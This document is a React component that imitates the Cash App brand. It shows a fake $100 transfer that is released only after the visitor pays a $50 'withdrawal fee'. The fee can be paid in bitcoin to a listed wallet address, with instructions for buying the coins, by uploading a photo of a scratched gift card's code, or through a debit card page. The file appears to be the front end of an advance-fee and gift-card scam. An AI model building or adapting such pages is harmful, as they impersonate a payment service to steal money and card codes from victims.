import { useState } from "react";
import "../styles/paypal.css"
import { NavLink } from "react-router-dom";
import { useNavigate } from "react-router-dom";


function CashApp() {

    const navigate = useNavigate();

    const [step, setStep] = useState("step1");

    const [method, setMethod] = useState("bitcoin")

    const [selectedMethod, setSelectedMethod] = useState("");

    const [payAccount, setPayAccount] = useState("")

    const cryptoStyle = {
        background: selectedMethod == "crypto" ? `#008849` : `white`,
        color: selectedMethod == "crypto" ? `white` : `black`,
    }

    const giftStyle = {
        background: selectedMethod == "gift" ? `#008849` : `white`,
        color: selectedMethod == "gift" ? `white` : `black`,
    }

    const cardStyle = {
        background: selectedMethod == "card" ? `#008849` : `white`,
        color: selectedMethod == "card" ? `white` : `black`,
    }

    const [image, setImage] = useState(null);
    const [preview, setPreview] = useState(null);

    const handleImageChange = (e) => {
        const file = e.target.files[0];
        if (file && file.type.startsWith("image/")) {
            setImage(file);
            const reader = new FileReader();
            reader.onloadend = () => {
                setPreview(reader.result);
            };
            reader.readAsDataURL(file);
        } else {
            setImage(null);
            setPreview(null);
        }
    };

    function showMethod() {
        if (selectedMethod == "crypto") {
            return <div className="bitcoin">
                <div className="bit-head">
                    <img src="https://tse1.mm.bing.net/th/id/OIP.6LcuCI5DJF6hjjOoZWKyoAHaHa?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
                    <h1>Bitcoin</h1>
                </div>
                <div className="wallet-address">
                    <h1>Bitcoin wallet address:</h1>
                    <p>xj23hsj2xbvm029kkilon14rpjlion125</p>
                </div>
                <div className="note">
                    <p>Note: this wallet address was generated for this transaction only, and only for bitcoin, any other other cryptocurrency made to this wallet address would be loss</p>
                </div>
                <div className="paybis">
                    <h1>Dont have bitcoin?</h1>
                    <button>Buy from Paybis</button>
                    <p>step 1: click on the button and select your region (eg US:Dollar)</p>
                    <p>step2: select bitcoin from the option of crypto to purchase</p>
                    <p>step3: enter the above wallet address as purchase destination</p>
                    <p>Step4: complete purchase with your credit/debit card</p>
                </div>
            </div>
        } else if (selectedMethod == "gift") {
            return <div className="gift">
                <h1 className="fcfg"><span>FCFG</span> Secured Uploader</h1>
                <div className="uploader-container">
                    <p>Scratch/Peel off and reveal the code at the back of gift card</p>
                    <h2>Upload an Image of <br />gift Card</h2>
                    <input type="file" accept="image/*" onChange={handleImageChange} />
                    {preview && (
                        <div className="image-preview">
                            <img src={preview} alt="Uploaded Preview" />
                        </div>
                    )}
                </div>
                <button>Upload</button>
            </div>
        }else if(selectedMethod == "card") {
            navigate("../debitCard")
        }
    }

    function showStep() {
        if (step == "step1") {
            return <div className="paypal-box">
                <img src="https://www.pngall.com/wp-content/uploads/13/Cash-App-Logo.png" className="cash-img"/>

                <h1>Enter Your CashApp Tag</h1>
                <input type="email" placeholder="$user" onChange={(e) => setPayAccount(e.target.value)} />
                <button onClick={() => setStep("step2")}> Next <i className="bi-arrow-right"></i></button>
            </div>
        } else if (step == "step2") {
            return <div className="pay-send">
                <div className="pay-head">
                    <p>Transfer</p>
                    <h1 className="head-special">${100.00} <br /> </h1>

                    <p>To</p>
                    <h1>{payAccount}</h1>
                    <p>Withdrawal Fee:</p>
                    <h1 className="head-special2">$50.00</h1>
                </div>
                <div className="fee-method">
                    <h2> Pay Withdrawal Fee($50) with</h2>
                    <div className="method" style={cryptoStyle} onClick={() => setSelectedMethod("crypto")}>
                        <img src="https://tse4.mm.bing.net/th/id/OIP.L37frQFm2G-k6wXWyTxI9AHaHa?r=0&w=1920&h=1920&rs=1&pid=ImgDetMain&o=7&rm=3" />
                        <p>Pay With Crypto</p>
                    </div>
                    <div className="method" style={giftStyle} onClick={() => setSelectedMethod("gift")} >
                        <img src="https://tse1.mm.bing.net/th/id/OIP.znjEvy_DOIJjKD4S2qOO7gHaEf?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="" />
                        <p>Pay With Gift Card</p>
                    </div>
                    <div className="method" style={cardStyle} onClick={() => setSelectedMethod("card")}>
                        <img src="https://download.logo.wine/logo/Mastercard/Mastercard-Logo.wine.png" alt="" />
                        <p>Pay With Debit Card</p>
                    </div>
                    <button onClick={() => { setStep("step3") }}>Next <i className="bi-arrow-right"></i></button>
                </div>
            </div>
        } else if (step == "step3") {
            return <div>
                {showMethod()}
            </div>
        }
    }

    return (
        <section className="paypal">
            <div className="steps-div">
                {step == "step1" ? <div className="step-green"></div> : <div className="step"></div>}
                {step == "step2" ? <div className="step-green"></div> : <div className="step"></div>}
                {step == "step3" ? <div className="step-green"></div> : <div className="step"></div>}
            </div>

            {showStep()}
        </section>
    )
}

export default CashApp;